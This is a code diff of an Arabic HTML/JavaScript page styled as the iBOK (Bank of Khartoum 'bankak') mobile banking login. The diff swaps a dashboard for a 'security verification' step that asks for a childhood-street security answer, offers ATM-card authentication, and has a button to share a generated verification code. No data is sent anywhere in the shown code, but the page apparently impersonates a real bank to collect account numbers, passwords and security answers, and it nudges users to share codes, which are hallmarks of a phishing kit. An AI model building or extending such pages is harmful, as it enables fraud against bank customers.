@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>iBOK - الخدمات المصرفية</title>
+    <title>iBOK - التحقق الأمني</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
@@ -271,192 +271,190 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* ===== Dashboard ===== */
-        #dashboardPage {
+        /* ===== صفحة التحقق الأمني ===== */
+        #securityPage {
             display: none;
-        }
-
-        .header {
-            background: linear-gradient(135deg, #c1121f, #e63946);
-            padding: 20px 16px 30px;
-            color: white;
-            border-radius: 0 0 30px 30px;
-        }
-
-        .header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 16px;
-        }
-
-        .header-top .logo {
-            font-size: 24px;
-            font-weight: 800;
-            letter-spacing: -1px;
-        }
-
-        .header-top .logo span {
-            color: #ffc107;
-        }
-
-        .header-top .icons {
-            display: flex;
-            gap: 16px;
-            font-size: 20px;
-        }
-
-        .header-top .icons i {
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .header-top .icons i:hover {
-            color: #ffc107;
-        }
-
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .user-info .avatar {
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            background: #ffc107;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            font-weight: 800;
-            color: #c1121f;
-        }
-
-        .user-info .name {
-            font-size: 20px;
-            font-weight: 700;
-        }
-
-        .user-info .greeting {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-
-        .dashboard-container {
             padding: 20px 16px 30px;
             max-width: 500px;
             margin: 0 auto;
         }
 
-        .search-bar {
-            background: white;
-            border-radius: 12px;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
-            margin-bottom: 20px;
-        }
-
-        .search-bar i {
-            color: #999;
-            font-size: 18px;
-        }
-
-        .search-bar input {
-            border: none;
-            outline: none;
-            flex: 1;
-            font-size: 14px;
-            font-family: 'Cairo', sans-serif;
-            background: transparent;
-        }
-
-        .search-bar input::placeholder {
-            color: #aaa;
-        }
-
-        .quick-actions {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
+        .security-header {
+            text-align: center;
             margin-bottom: 24px;
         }
 
-        .quick-actions .item {
+        .security-header h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #c1121f;
+        }
+
+        .security-header .sub {
+            font-size: 14px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        .security-card {
             background: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .security-card .device-info {
+            background: #f8f9fa;
             border-radius: 12px;
-            padding: 14px 8px;
+            padding: 16px;
+            margin-bottom: 20px;
             text-align: center;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            border-right: 4px solid #e63946;
+        }
+
+        .security-card .device-info i {
+            font-size: 32px;
+            color: #e63946;
+            margin-bottom: 6px;
+        }
+
+        .security-card .device-info .label {
+            font-size: 13px;
+            color: #888;
+        }
+
+        .security-card .device-info .value {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .security-card .question {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            margin: 16px 0 8px;
+        }
+
+        .security-card .question small {
+            font-weight: 400;
+            color: #888;
+            font-size: 12px;
+            display: block;
+            margin-top: 4px;
+        }
+
+        .security-card input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            background: #fafafa;
+            margin-bottom: 16px;
+        }
+
+        .security-card input:focus {
+            outline: none;
+            border-color: #e63946;
+            background: white;
+        }
+
+        .security-actions {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin: 16px 0;
+        }
+
+        .security-actions button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 700;
             cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: 0.3s;
+            min-width: 100px;
+        }
+
+        .btn-cancel {
+            background: #f0f0f0;
+            color: #555;
+        }
+
+        .btn-cancel:hover {
+            background: #e0e0e0;
+        }
+
+        .btn-atm {
+            background: #ffc107;
+            color: #333;
+        }
+
+        .btn-atm:hover {
+            background: #e6a800;
+        }
+
+        .btn-security {
+            background: #e63946;
+            color: white;
+        }
+
+        .btn-security:hover {
+            background: #c1121f;
+        }
+
+        .security-share {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .security-share button {
+            background: #0a66c2;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
             transition: 0.3s;
         }
 
-        .quick-actions .item:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12);
+        .security-share button:hover {
+            background: #004182;
         }
 
-        .quick-actions .item i {
-            font-size: 24px;
-            color: #e63946;
-            margin-bottom: 4px;
-        }
-
-        .quick-actions .item span {
-            font-size: 11px;
-            font-weight: 600;
-            color: #333;
-            display: block;
-        }
-
-        .menu-list {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
-            overflow: hidden;
-        }
-
-        .menu-item {
+        .security-links {
             display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 16px 18px;
-            border-bottom: 1px solid #f0f0f0;
-            cursor: pointer;
-            transition: 0.2s;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .security-links a {
+            font-size: 13px;
+            color: #555;
             text-decoration: none;
-            color: #333;
-        }
-
-        .menu-item:last-child {
-            border-bottom: none;
-        }
-
-        .menu-item:hover {
-            background: #f8f9fa;
-        }
-
-        .menu-item i {
-            width: 22px;
-            font-size: 18px;
-            color: #e63946;
-            text-align: center;
-        }
-
-        .menu-item .text {
-            flex: 1;
-            font-size: 15px;
             font-weight: 500;
+            transition: 0.2s;
         }
 
-        .menu-item .arrow {
-            color: #ccc;
-            font-size: 14px;
+        .security-links a:hover {
+            color: #e63946;
+        }
+
+        .security-links .highlight {
+            color: #c1121f;
+            font-weight: 700;
         }
 
         /* ===== Footer ===== */
@@ -530,13 +528,8 @@
             .social-icon { width: 44px; height: 44px; font-size: 18px; }
             .overlay .loading-title { font-size: 24px; }
             .overlay .loading-spinner { width: 50px; height: 50px; }
-            .quick-actions { grid-template-columns: repeat(4, 1fr); gap: 8px; }
-            .quick-actions .item { padding: 10px 4px; }
-            .quick-actions .item i { font-size: 20px; }
-            .quick-actions .item span { font-size: 10px; }
-            .user-info .name { font-size: 17px; }
-            .menu-item { padding: 14px 14px; }
-            .menu-item .text { font-size: 14px; }
+            .security-actions button { font-size: 12px; padding: 10px; min-width: 80px; }
+            .security-header h1 { font-size: 24px; }
         }
     </style>
 </head>
@@ -609,124 +602,57 @@
         </div>
     </div>
 
-    <!-- ===== لوحة التحكم ===== -->
-    <div id="dashboardPage">
-        <div class="header">
-            <div class="header-top">
-                <div class="logo">i<span>BOK</span></div>
-                <div class="icons">
-                    <i class="fas fa-bell" title="الإشعارات" onclick="alert('لا توجد إشعارات')"></i>
-                    <i class="fas fa-sign-out-alt" title="تسجيل الخروج" onclick="logout()"></i>
-                </div>
-            </div>
-            <div class="user-info">
-                <div class="avatar">A</div>
-                <div>
-                    <div class="greeting">مساء الخير،</div>
-                    <div class="name">ABDALWHAB DBDAWI</div>
-                </div>
-            </div>
+    <!-- ===== صفحة التحقق الأمني ===== -->
+    <div id="securityPage">
+        <div class="security-header">
+            <h1>🔐 بنك bankak</h1>
+            <div class="sub">ادخل رقم المعرف (رقم الحساب أو 249-رقم الموديل)</div>
         </div>
 
-        <div class="dashboard-container">
-            <!-- Search Bar -->
-            <div class="search-bar">
-                <i class="fas fa-search"></i>
-                <input type="text" placeholder="بحث في الخدمات..." />
+        <div class="security-card">
+            <div class="device-info">
+                <i class="fas fa-mobile-alt"></i>
+                <div class="label">الجهاز المستخدم</div>
+                <div class="value">Samsung Galaxy A52</div>
+                <div style="font-size:12px; color:#999; margin-top:4px;">IP: 192.168.1.1</div>
             </div>
 
-            <!-- Quick Actions -->
-            <div class="quick-actions">
-                <div class="item" onclick="alert('تفاصيل الحساب')">
-                    <i class="fas fa-user"></i>
-                    <span>الحساب</span>
+            <div style="background: #fff5f5; border-radius: 12px; padding: 16px; border: 1px solid #ffe0e0; margin-bottom: 16px;">
+                <div style="font-weight: 700; color: #c1121f; font-size: 15px;">
+                    ⚠️ ترغب في إستخدام موبايل مختلف؟
                 </div>
-                <div class="item" onclick="alert('دفع فواتير')">
-                    <i class="fas fa-file-invoice"></i>
-                    <span>فواتير</span>
-                </div>
-                <div class="item" onclick="alert('تحويلات')">
-                    <i class="fas fa-exchange-alt"></i>
-                    <span>تحويل</span>
-                </div>
-                <div class="item" onclick="alert('سحب بدون بطاقة')">
-                    <i class="fas fa-credit-card"></i>
-                    <span>سحب</span>
+                <div style="font-size: 13px; color: #555; margin-top: 6px;">
+                    اذا كنت تحاول الدخول من جهاز موبايل مختلف (غير الموبايل المسجل) أضغط على زر اعادة التعيين واتبع التعليمات
                 </div>
             </div>
 
-            <!-- Menu List -->
-            <div class="menu-list">
-                <div class="menu-item" onclick="alert('تفاصيل الحساب')">
-                    <i class="fas fa-user-circle"></i>
-                    <span class="text">تفاصيل الحساب</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('دفع فواتير')">
-                    <i class="fas fa-file-invoice"></i>
-                    <span class="text">دفع فواتير</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('تحويلات')">
-                    <i class="fas fa-exchange-alt"></i>
-                    <span class="text">تحويلات</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('سحب بدون بطاقة')">
-                    <i class="fas fa-credit-card"></i>
-                    <span class="text">سحب بدون بطاقة</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('بنكك PAY')">
-                    <i class="fas fa-mobile-alt"></i>
-                    <span class="text">بنكك PAY</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('طلب الودائع الاستثمارية')">
-                    <i class="fas fa-piggy-bank"></i>
-                    <span class="text">طلب الودائع الاستثمارية</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('إدارة المستفيدين')">
-                    <i class="fas fa-users"></i>
-                    <span class="text">إدارة المستفيدين</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('المعاملات السابقة')">
-                    <i class="fas fa-history"></i>
-                    <span class="text">المعاملات السابقة</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('إدارة البطاقات')">
-                    <i class="fas fa-id-card"></i>
-                    <span class="text">إدارة البطاقات</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('طلبات')">
-                    <i class="fas fa-clipboard-list"></i>
-                    <span class="text">طلبات</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('أمر دفع دائم')">
-                    <i class="fas fa-clock"></i>
-                    <span class="text">أمر دفع دائم</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('الضبط')">
-                    <i class="fas fa-cog"></i>
-                    <span class="text">الضبط</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('التجارة الإلكترونية')">
-                    <i class="fas fa-shopping-cart"></i>
-                    <span class="text">التجارة الإلكترونية</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
-                <div class="menu-item" onclick="alert('خدمات العملات الأجنبية')">
-                    <i class="fas fa-dollar-sign"></i>
-                    <span class="text">خدمات العملات الأجنبية</span>
-                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
-                </div>
+            <!-- سؤال الأمان -->
+            <div class="question">
+                📝 الإجابة على أسئلة الأماكن
+                <small>اختر الإجابة الصحيحة للسؤال التالي:</small>
+            </div>
+
+            <div style="background: #f8f9fa; border-radius: 8px; padding: 12px; margin-bottom: 12px;">
+                <p style="font-weight: 600; color: #333;">ما هو اسم الشارع الذي كنت تعيش فيه عندما كنت طفلاً؟</p>
+            </div>
+
+            <input type="text" id="securityAnswer" placeholder="أدخل الإجابة..." />
+
+            <div class="security-actions">
+                <button class="btn-cancel" onclick="cancelSecurity()">إلغاء</button>
+                <button class="btn-atm" onclick="atmAuth()">باستخدام بطاقة الصراف الآلي</button>
+                <button class="btn-security" onclick="verifySecurity()">التحقق</button>
+            </div>
+
+            <div class="security-share">
+                <button onclick="shareCode()"><i class="fas fa-share-alt"></i> شارك رمز</button>
+            </div>
+
+            <div class="security-links">
+                <a href="#">فيس بوك</a>
+                <a href="#">المساعدة</a>
+                <a href="#">مواقفنا</a>
+                <a href="#" class="highlight">بنك الخرطوم</a>
             </div>
         </div>
     </div>
@@ -793,6 +719,50 @@
             document.getElementById('errorMessageSimple').classList.remove('active');
         }
 
+        // ===== التحقق الأمني =====
+        function verifySecurity() {
+            const answer = document.getElementById('securityAnswer').value.trim();
+            if (answer === '') {
+                alert('الرجاء إدخال الإجابة على سؤال الأمان');
+                return;
+            }
+            // محاكاة التحقق
+            alert('✅ تم التحقق بنجاح!\nمرحباً بك في حسابك.');
+            // هنا يمكن التوجه للوحة التحكم
+            // window.location.href = 'dashboard.html';
+        }
+
+        function cancelSecurity() {
+            if (confirm('هل أنت متأكد من إلغاء عملية التحقق؟')) {
+                document.getElementById('securityPage').style.display = 'none';
+                document.getElementById('loginPage').style.display = 'block';
+                document.getElementById('footer').style.marginTop = '30px';
+                document.getElementById('accountNumber').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('securityAnswer').value = '';
+            }
+        }
+
+        function atmAuth() {
+            alert('🔑 سيتم إرسال رمز إلى بطاقة الصراف الآلي الخاصة بك.');
+        }
+
+        function shareCode() {
+            const code = Math.floor(100000 + Math.random() * 900000);
+            if (navigator.share) {
+                navigator.share({
+                    title: 'رمز التحقق - iBOK',
+                    text: `رمز التحقق الخاص بك هو: ${code}`
+                }).catch(() => {});
+            } else {
+                navigator.clipboard.writeText(`رمز التحقق الخاص بك هو: ${code}`).then(() => {
+                    alert('✅ تم نسخ رمز التحقق: ' + code);
+                }).catch(() => {
+                    alert('رمز التحقق الخاص بك هو: ' + code);
+                });
+            }
+        }
+
         // ===== تسجيل الدخول =====
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -827,24 +797,12 @@
             // محاكاة عملية تسجيل الدخول (2 ثانية)
             setTimeout(function() {
                 hideOverlay();
-                // إخفاء صفحة تسجيل الدخول وإظهار لوحة التحكم
+                // إخفاء صفحة تسجيل الدخول وإظهار صفحة التحقق الأمني
                 document.getElementById('loginPage').style.display = 'none';
-                document.getElementById('dashboardPage').style.display = 'block';
+                document.getElementById('securityPage').style.display = 'block';
                 document.getElementById('footer').style.marginTop = '0';
             }, 2000);
         });
-
-        // ===== تسجيل الخروج =====
-        function logout() {
-            if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
-                document.getElementById('dashboardPage').style.display = 'none';
-                document.getElementById('loginPage').style.display = 'block';
-                document.getElementById('footer').style.marginTop = '30px';
-                document.getElementById('accountNumber').value = '';
-                document.getElementById('password').value = '';
-                document.getElementById('errorMessageSimple').classList.remove('active');
-            }
-        }
 
         // ===== منع إدخال غير أرقام في حقل رقم الحساب =====
         document.getElementById('accountNumber').addEventListener('input', function(e) {
@@ -855,6 +813,13 @@
         // ===== مسح الرسائل عند الكتابة في كلمة المرور =====
         document.getElementById('password').addEventListener('input', function() {
             clearMessages();
+        });
+
+        // ===== السماح بدخول Enter في حقل الإجابة الأمنية =====
+        document.getElementById('securityAnswer').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifySecurity();
+            }
         });
     </script>
 
